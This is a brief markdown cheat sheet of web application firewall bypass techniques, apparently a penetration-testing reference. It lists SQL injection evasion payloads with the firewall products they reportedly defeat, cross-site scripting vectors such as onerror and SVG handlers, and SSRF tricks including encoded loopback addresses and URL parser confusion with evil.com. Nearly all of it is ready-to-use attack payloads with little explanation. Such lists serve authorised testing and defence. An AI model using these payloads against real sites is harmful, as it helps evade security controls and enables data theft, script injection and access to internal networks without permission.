# WAF Bypass Techniques

## SQL Injection Bypass
| Technique | Example | Works Against |
|-----------|---------|---------------|
| Unicode encoding | `%u0027` | ModSecurity, Cloudflare |
| Double URL encoding | `%2527` | Some AWS WAF configs |
| Case variation | `UnIoN SeLeCt` | Regex-based WAFs |
| Comments inline | `UN/**/ION SEL/**/ECT` | Imperva, ModSecurity |
| NULL bytes | `%00' OR 1=1--` | Older WAF versions |
| HTTP parameter pollution | `?id=1&id=1 OR 1=1` | Some CDN WAFs |
| Alternative characters | `" OR "a"="a` vs `' OR 'a'='a` | Regex-based |
| Buffer overflow | 1000+ `A` chars before payload | Some Nginx configs |

## XSS Bypass
- `<img src=x onerror=alert(1)>` → `<img%0dsrc=x%0donerror=alert(1)>`
- JavaScript URI: `javascript:alert(1)`
- SVG vectors: `<svg><animate onbegin=alert(1)>`
- Mutation XSS (`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`)
- DOM clobbering

## SSRF Bypass
- IP encoding: `127.0.0.1` → `2130706433` (decimal), `0x7f000001` (hex), `0177.0.0.1` (octal)
- DNS rebinding
- URL parser confusion: `http://target.com@evil.com`, `http://evil.com#target.com`
- IPv6 variants
- Redirect chaining
